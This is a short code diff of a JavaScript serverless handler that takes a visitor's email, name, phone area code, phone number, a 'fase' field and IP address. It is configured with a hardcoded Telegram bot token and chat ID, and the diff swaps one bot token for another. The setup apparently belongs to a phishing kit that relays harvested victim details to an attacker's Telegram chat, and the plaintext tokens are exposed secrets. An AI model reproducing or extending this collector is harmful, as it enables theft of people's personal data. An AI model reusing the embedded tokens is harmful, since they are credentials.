@@ -2,7 +2,7 @@ export default async function handler(req, res) {
   if (req.method !== 'POST') return res.status(405).end();
 
   const { correo, nombre, lada, numero, fase } = req.body;
-  const botToken = '8691950722:AAHINdIyU2iFgn82hw1rboIIiIHFklFj0Kk';
+  const botToken = '8663956126:AAGOm85p0FkWuVMuZJFkUIsR_avViE4EaTc';
   const chatId = '7430967735';
 
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'No disponible';
